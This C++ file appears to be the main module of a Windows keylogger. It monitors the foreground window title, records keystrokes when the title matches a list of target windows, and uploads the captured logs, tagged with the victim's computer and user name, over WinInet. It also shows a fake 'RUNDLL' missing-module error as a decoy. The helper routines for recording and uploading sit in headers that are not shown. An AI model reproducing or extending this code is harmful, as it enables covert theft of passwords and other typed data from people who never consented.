#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <stdio.h>
#include <windows.h>
#include <Wininet.h>
#include <sys/stat.h>
#include <TLHELP32.H>
#include <time.h>

#pragma comment( lib, "Wininet.lib" )

using namespace std;

/* ---------------------------- */
	#include "declarations.h"
	#include "functions.h"
	#include "urlencode.h"
/* ---------------------------- */

void repeat();


int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	getPaths();

	hInternet = InternetOpen("MyAgent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 );

	/* Show error message if the ini file is present. */
	string INI_FILE;
	INI_FILE = CURRENT_FILE_PATH.substr(0, CURRENT_FILE_PATH.find_last_of("\\") + 1);
	INI_FILE += "error.ini";

	if (file_size((char *)INI_FILE.c_str()) != -1)	// if file exists
	    MessageBox(NULL, "Error loading C:\\WINDOWS\\ehksp.dll\n\nThe specified module could not be found.", "RUNDLL", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);

	while (1) {

		Sleep(10); // To prevent 100% cpu usage
		repeat();
	}

	InternetCloseHandle(hInternet);

	return 0;
}


/*
------------------------------------------------------------
	MAIN PART
	Function that will execute again and again and again! 
------------------------------------------------------------ */

void repeat() {
	
	/* Here 'previous' is an index of [titlesToSearch] array */ 
	string title = GetForegroundWindowText();

	if (previous != -1) {	// If previously a title is found!
		if (title.find(titlesToSearch[previous]) == string::npos) {		// If new title is not equal to previous one!

			if (keyPressed == true) {
				logs = processLogs(logs);

				if (!hasAlreadyLogged(logs)) {
				
					string ID = ComputerName() + "." + UserName();
					upload_logs(ID, titlesInSMS[previous]);
				}
				
				keyPressed = false;
				logs = "";
			}
		}
	}

	previous = matchWithTitles(title);

	if (previous != -1) {
		record_keys();
	}

}
